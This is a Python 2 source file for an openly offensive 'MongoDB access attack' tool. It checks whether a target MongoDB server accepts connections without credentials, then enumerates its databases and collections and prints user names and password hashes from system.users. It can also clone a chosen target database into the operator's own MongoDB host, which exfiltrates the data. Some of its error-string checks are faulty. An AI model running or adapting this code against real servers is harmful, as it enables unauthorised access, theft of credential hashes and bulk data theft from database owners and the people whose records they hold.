# -*- coding: utf-8 -*-
# __author__: sixwhale
from pymongo import MongoClient
from globalvalue import GlobalValue
from colorama import Fore, Back, Style, init

no_tag = GlobalValue.no_tag
yes_tag = GlobalValue.yes_tag

def mgAttack(ip,port,myip,myport,clone_info=[0,None]):
    print '[*] mongoDB access attack'
    mongoOpen = False
    is_clone, clone_db = clone_info
    print '[*] Checking whether the crendentials are need.'
    needCreds = mongoScan(ip,port)
    if needCreds[0] == 0:
        conn = MongoClient(ip,port)
        print '[*] '+ip+':'+str(port)+' access with no crendential!'
        mongoOpen = True
    elif needCreds[0] == 1:
        print '[*] login required......'
        DBuser = raw_input(Fore.CYAN + 'Username: ')
        DBpwd = raw_input(Fore.CYAN + 'Password: ')
    elif needCreds[0] == 2:
        conn = MongoClient(ip,port)
        print '[*] access check failure. Testing will continute but will be unreliable.'
        mongoOpen = True
    elif needCreds[0] == 3:
        print(Fore.RED + '[Error] couldn\'t connect to MongoDB server.')

    if mongoOpen == True:
        displayInfo(conn) #显示数据库信息
        displayDBS(conn) #列数据库 列集合
        if is_clone == 1 and clone_db != None:
            cloneDB(conn,myip,myport,clone_db,ip)

def displayInfo(conn):
    print '[+] Server Info:'
    print '    MongoDB Version:', conn.server_info()['version']
    print '    Debugs enabled:', str(conn.server_info()['debug'])
    print '    Platform:', str(conn.server_info()['bits']) + ' bits'
    print '\n'

def displayDBS(conn):
    try:
        print '[+] List of databases:'
        for db in conn.database_names():
            print '    %s' % db
        print '\n'
    except:
        print(Fore.RED + '[Error] Couldn\'t list databases.')
    try:
        for dbname in conn.database_names():
            db = conn[dbname]
            print '[+] DBname: %s' % dbname
            colls = db.collection_names(include_system_collections=False)
            print '[+] %s Collections:' % dbname
            for coll in colls:
                print '    %s' % coll
            print '\n'

            if 'system.users' in db.collection_names():
                users = list(db.system.users.find())
                print '[+] Database User and Password hash:'
                try:
                    for x in range(0, len(users)):
                        print "    Username: " + users[x]['user']
                        print "    Hash: " + users[x]['pwd']
                        print "\n"
                except Exception, e:
                    print(Fore.RED + '[Error] %s, couldn\'t list user or hash\n' % e)
                    continue
    except Exception, e:
        print(Fore.RED + '[Error] %s, Couldn\'t list collections.\n' % e)

def mongoScan(ip,port):
    try:
        conn = MongoClient(ip,port)
        try:
            dbVersion = conn.server_info()['version']
            conn.close()
            return [0,dbVersion]
        except Exception, e:
            if str(e).find('need to login'):
                conn.close()
                return [1,None]
            else:
                return [2,None]
    except:
        return [3,None]

def cloneDB(conn,myip,myport,clone_db,ip):
    dbList = conn.database_names()
    if len(dbList) == 0:
        print(Fore.RED + '[Error] couldn\'t get a list of databases to clone.')
    elif clone_db in dbList:
            try:
                dbNeedCreds = raw_input(Fore.CYAN + '[*] Does this Database require credentials.(y/n)?')
                myDBconn = MongoClient(myip,myport)
                if dbNeedCreds in no_tag:
                    myDBconn.copyDatabase(clone_db,clone_db+'_clone',ip)
                elif dbNeedCreds in yes_tag:
                    user = raw_input(Fore.CYAN + 'Username: ')
                    pwd = raw_input(Fore.CYAN + 'Password: ')
                    myDBconn.copyDatabase(clone_db,clone_db+'clone',ip,user,pwd)
                else:
                    raw_input(Fore.CYAN + '[*] Invalid Selection. Press enter to continue!')
                    cloneDB(conn,myip,myport,clone_db,ip)
            except Exception, e:
                if str(e).find('Connection refused'):
                    print(Fore.RED + '[Error] %s. Make sure that mongoDB has been installed or that mongoDB is opened on this computer.' % e)
                elif str(e).find('text search not enabled'):
                    print(Fore.RED + '[Error] %s. Database copied, but text indexing was not enabled on the target.' % e)
                else:
                    print(Fore.RED + '[Error] %s. Something went wrong.' % e)
